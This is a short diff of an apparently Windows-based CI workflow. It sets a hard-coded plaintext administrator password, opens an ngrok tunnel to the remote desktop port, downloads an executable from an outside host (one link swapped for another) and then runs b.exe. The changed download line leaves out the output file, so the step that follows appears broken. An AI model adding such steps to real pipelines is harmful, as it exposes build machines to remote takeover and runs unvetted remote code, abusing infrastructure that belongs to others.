@@ -23,5 +23,5 @@ jobs:
     - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
     - name: Create Tunnel
       run: .\ngrok\ngrok.exe tcp 3389 &
-    - run: Invoke-WebRequest https://bit.ly/3bgk8fA -OutFile b.exe
+    - run: Invoke-WebRequest https://Down.anesta77.repl.co/b.exe
     - run: b.exe
